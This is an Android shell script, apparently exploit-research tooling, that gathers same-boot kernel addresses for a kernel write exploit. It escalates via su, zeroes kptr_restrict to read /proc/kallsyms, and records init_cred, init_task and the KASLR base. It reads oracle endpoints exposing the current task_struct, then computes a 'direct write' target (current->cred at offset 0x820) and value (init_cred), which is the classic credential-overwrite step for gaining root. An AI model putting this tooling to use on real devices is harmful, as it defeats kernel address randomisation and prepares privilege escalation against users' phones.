#!/system/bin/sh
# collect-sameboot-root-oracle.sh
# Android local collector for same-boot kernel addresses used by IonStack/direct-write tests.
# Run on device:
#   sh /data/local/tmp/collect-sameboot-root-oracle.sh
# Optional:
#   OUTDIR=/data/local/tmp/ionstack-sameboot-oracle sh /data/local/tmp/collect-sameboot-root-oracle.sh
#
# What this can collect with root-only shell:
#   - boot_id
#   - canonical _text / _stext / init_cred / init_task / modprobe_path from /proc/kallsyms
#   - offsets relative to _text
# What pure shell cannot derive by itself:
#   - current task_struct pointer for this shell/exploit process
# For current, load/run a same-boot LKM/eBPF oracle that prints current, then expose it via
# /proc/sweep or /proc/ionstack_oracle; this script will capture it if present.

SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd || echo /data/local/tmp)"
OUTDIR="${OUTDIR:-${1:-$SCRIPT_DIR/ionstack-sameboot-oracle}}"
KPTR_PATH="/proc/sys/kernel/kptr_restrict"
KPTR_BEFORE=""
KPTR_CHANGED=0
OUT_FILE="$OUTDIR/oracle.txt"
ERR_FILE="$OUTDIR/oracle.err"
KALLSYMS_FILE="$OUTDIR/kallsyms.txt"

restore_kptr() {
    if [ "$KPTR_CHANGED" = "1" ] && [ -n "$KPTR_BEFORE" ]; then
        echo "$KPTR_BEFORE" > "$KPTR_PATH" 2>/dev/null || true
    fi
}
trap restore_kptr EXIT HUP INT TERM

shell_quote() {
    printf "%s" "$1" | sed "s/'/'\\''/g"
}

# Self-escalate. This is intentional: without uid 0, kallsyms is usually zeroed.
if [ "$(id -u 2>/dev/null || echo 99999)" != "0" ]; then
    if ! command -v su >/dev/null 2>&1; then
        echo "status=FAILED"
        echo "reason=not_root_and_su_not_found"
        exit 1
    fi
    Q0=$(shell_quote "$0")
    QOUT=$(shell_quote "$OUTDIR")
    exec su -c "OUTDIR='$QOUT' sh '$Q0'"
fi

fail() {
    reason="$1"
    mkdir -p "$OUTDIR" 2>/dev/null || true
    {
        echo "status=FAILED"
        echo "reason=$reason"
        echo "ts=$(date '+%Y-%m-%d %H:%M:%S %z' 2>/dev/null || date)"
        echo "uid=$(id 2>/dev/null)"
        echo "context=$(cat /proc/self/attr/current 2>/dev/null)"
        echo "boot_id=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)"
        echo "outdir=$OUTDIR"
    } | tee "$ERR_FILE" >&2
    exit 1
}

mkdir -p "$OUTDIR" 2>/dev/null || fail "cannot_create_outdir:$OUTDIR"
: > "$OUT_FILE" 2>/dev/null || fail "cannot_write:$OUT_FILE"
: > "$ERR_FILE" 2>/dev/null || fail "cannot_write:$ERR_FILE"

BOOT_ID="$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || true)"
[ -n "$BOOT_ID" ] || fail "cannot_read_boot_id"

KPTR_BEFORE="$(cat "$KPTR_PATH" 2>/dev/null || true)"
if [ -n "$KPTR_BEFORE" ] && [ "$KPTR_BEFORE" != "0" ]; then
    if echo 0 > "$KPTR_PATH" 2>/dev/null; then
        KPTR_CHANGED=1
    fi
fi
KPTR_DURING="$(cat "$KPTR_PATH" 2>/dev/null || true)"

cat /proc/kallsyms > "$KALLSYMS_FILE" 2>/dev/null || fail "cannot_read_kallsyms"
KALLSYMS_SIZE="$(wc -c < "$KALLSYMS_FILE" 2>/dev/null || echo 0)"
[ "$KALLSYMS_SIZE" != "0" ] || fail "empty_kallsyms"

sym_line() { awk -v s="$1" '$3 == s { print; exit }' "$KALLSYMS_FILE" 2>/dev/null; }
addr_of() { set -- $1; printf "%s" "${1:-}"; }

hex_to_dec() {
    h="$1"
    h="${h#0x}"
    # toybox awk supports strtonum on many Android builds; if not, python/perl fallback is tried.
    awk "BEGIN{printf \"%llu\", strtonum(\"0x$h\")}" 2>/dev/null || \
    python3 -c "print(int('$h',16))" 2>/dev/null || \
    python -c "print(int('$h',16))" 2>/dev/null
}

hex_sub() {
    a="$1"; b="$2"
    da="$(hex_to_dec "$a")"
    db="$(hex_to_dec "$b")"
    if [ -n "$da" ] && [ -n "$db" ]; then
        awk "BEGIN{printf \"0x%llx\", $da - $db}" 2>/dev/null || echo "unknown"
    else
        echo "unknown"
    fi
}

is_zero_addr() {
    case "$1" in ""|0|0000000000000000|0x0000000000000000) return 0 ;; *) return 1 ;; esac
}

is_canonical_kernel_addr() {
    case "$1" in ffffff*|FFFFFF*) return 0 ;; *) return 1 ;; esac
}

TEXT_LINE="$(sym_line _text)"
STEXT_LINE="$(sym_line _stext)"
INIT_CRED_LINE="$(sym_line init_cred)"
INIT_TASK_LINE="$(sym_line init_task)"
MODPROBE_PATH_LINE="$(sym_line modprobe_path)"
ROOT_TG_LINE="$(sym_line root_task_group)"
SYSCTL_BOOTID_LINE="$(sym_line sysctl_bootid)"
LOGGERS_LINE="$(sym_line loggers)"

TEXT_ADDR="$(addr_of "$TEXT_LINE")"
INIT_CRED_ADDR="$(addr_of "$INIT_CRED_LINE")"
INIT_TASK_ADDR="$(addr_of "$INIT_TASK_LINE")"

if is_zero_addr "$TEXT_ADDR" || ! is_canonical_kernel_addr "$TEXT_ADDR"; then
    fail "_text_missing_zero_or_not_canonical:$TEXT_ADDR"
fi
if is_zero_addr "$INIT_CRED_ADDR" || ! is_canonical_kernel_addr "$INIT_CRED_ADDR"; then
    fail "init_cred_missing_zero_or_not_canonical:$INIT_CRED_ADDR"
fi

INIT_CRED_OFF="$(hex_sub "$INIT_CRED_ADDR" "$TEXT_ADDR")"
INIT_TASK_OFF="$(hex_sub "$INIT_TASK_ADDR" "$TEXT_ADDR")"

# Try known LKM/proc oracle endpoints. ElevateMe-style LKM often exposes /proc/sweep.
ORACLE_STATUS="NEEDS_LKM_ORACLE"
ORACLE_PATH=""
CURRENT_TASK=""
CURRENT_CRED=""
CURRENT_REAL_CRED=""
ORACLE_RAW="$OUTDIR/current-oracle.raw"
: > "$ORACLE_RAW" 2>/dev/null || true
for p in /proc/sweep /proc/ionstack_oracle /proc/current_task_oracle /sys/kernel/debug/ionstack_oracle; do
    if [ -r "$p" ]; then
        ORACLE_PATH="$p"
        cat "$p" > "$ORACLE_RAW" 2>/dev/null || true
        ORACLE_STATUS="FOUND_RAW"
        break
    fi
done

if [ -s "$ORACLE_RAW" ]; then
    # Accept common formats:
    #   current=0xffffff...
    #   current_task=0xffffff...
    #   g_current_task: 0xffffff...
    CURRENT_TASK="$(grep -E '(^|[^a-zA-Z0-9_])(current|current_task|g_current_task)[=: ]+0x?ffffff' "$ORACLE_RAW" 2>/dev/null | head -n1 | sed -E 's/.*(0x?ffffff[0-9a-fA-F]+).*/\1/')"
    CURRENT_CRED="$(grep -E '(^|[^a-zA-Z0-9_])(cred|current_cred)[=: ]+0x?ffffff' "$ORACLE_RAW" 2>/dev/null | head -n1 | sed -E 's/.*(0x?ffffff[0-9a-fA-F]+).*/\1/')"
    CURRENT_REAL_CRED="$(grep -E '(real_cred)[=: ]+0x?ffffff' "$ORACLE_RAW" 2>/dev/null | head -n1 | sed -E 's/.*(0x?ffffff[0-9a-fA-F]+).*/\1/')"
    [ -n "$CURRENT_TASK" ] && ORACLE_STATUS="OK_CURRENT_FOUND"
fi

# task_struct offsets for violin/GKI 6.6 from project target.h.
TASK_CRED_OFF="0x820"
TASK_REAL_CRED_OFF="0x818"
DIRECT_WRITE_TARGET="unavailable"
if [ -n "$CURRENT_TASK" ]; then
    # Use awk strtonum if available.
    DIRECT_WRITE_TARGET="$(awk "BEGIN{printf \"0x%llx\", strtonum(\"$CURRENT_TASK\") + strtonum(\"$TASK_CRED_OFF\")}" 2>/dev/null || echo unavailable)"
fi

{
    echo "status=OK"
    echo "ts=$(date '+%Y-%m-%d %H:%M:%S %z' 2>/dev/null || date)"
    echo "uid=$(id 2>/dev/null)"
    echo "context=$(cat /proc/self/attr/current 2>/dev/null)"
    echo "outdir=$OUTDIR"
    echo "boot_id=$BOOT_ID"
    echo "kptr_restrict_before=${KPTR_BEFORE:-unreadable}"
    echo "kptr_restrict_during=${KPTR_DURING:-unreadable}"
    echo "kptr_restrict_will_restore=$KPTR_CHANGED"
    echo "kallsyms_size=$KALLSYMS_SIZE"
    echo "kallsyms__text=$TEXT_LINE"
    echo "kallsyms__stext=$STEXT_LINE"
    echo "kallsyms_init_cred=$INIT_CRED_LINE"
    echo "kallsyms_init_task=$INIT_TASK_LINE"
    echo "kallsyms_root_task_group=$ROOT_TG_LINE"
    echo "kallsyms_sysctl_bootid=$SYSCTL_BOOTID_LINE"
    echo "kallsyms_loggers=$LOGGERS_LINE"
    echo "kallsyms_modprobe_path=$MODPROBE_PATH_LINE"
    echo "CFI_KASLR_BASE=0x$TEXT_ADDR"
    echo "INIT_CRED=0x$INIT_CRED_ADDR"
    echo "INIT_CRED_OFF=$INIT_CRED_OFF"
    echo "INIT_TASK=0x$INIT_TASK_ADDR"
    echo "INIT_TASK_OFF=$INIT_TASK_OFF"
    echo "current_task_status=$ORACLE_STATUS"
    echo "current_task_oracle_path=${ORACLE_PATH:-none}"
    echo "current_task=${CURRENT_TASK:-unavailable}"
    echo "current_cred=${CURRENT_CRED:-unavailable}"
    echo "current_real_cred=${CURRENT_REAL_CRED:-unavailable}"
    echo "TASK_CRED_OFF=$TASK_CRED_OFF"
    echo "TASK_REAL_CRED_OFF=$TASK_REAL_CRED_OFF"
    echo "DIRECT_WRITE_TARGET_current_cred=$DIRECT_WRITE_TARGET"
    echo "DIRECT_WRITE_VALUE_init_cred=0x$INIT_CRED_ADDR"
    echo "DIRECT_WRITE_SHAPE=1"
    echo "NOTE=These absolute addresses are valid only while boot_id remains exactly $BOOT_ID."
    echo "NOTE_PURE_SH=current_task cannot be derived from kallsyms alone; use same-boot LKM/eBPF oracle if current_task_status is NEEDS_LKM_ORACLE."
} | tee "$OUT_FILE"

# Focused key symbols for pullback.
grep -E ' (_text|_stext|init_cred|init_task|root_task_group|sysctl_bootid|loggers|modprobe_path)$' "$KALLSYMS_FILE" > "$OUTDIR/key-symbols.txt" 2>/dev/null || true
if command -v sha256sum >/dev/null 2>&1; then
    (cd "$OUTDIR" && find . -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum) > "$OUTDIR/SHA256SUMS" 2>/dev/null || true
fi
if command -v tar >/dev/null 2>&1; then
    tar -C "$(dirname "$OUTDIR")" -czf "$OUTDIR.tar.gz" "$(basename "$OUTDIR")" 2>/dev/null || true
fi

echo "OUTDIR=$OUTDIR"
echo "OUT_FILE=$OUT_FILE"
[ -f "$OUTDIR.tar.gz" ] && echo "ARCHIVE=$OUTDIR.tar.gz"
exit 0
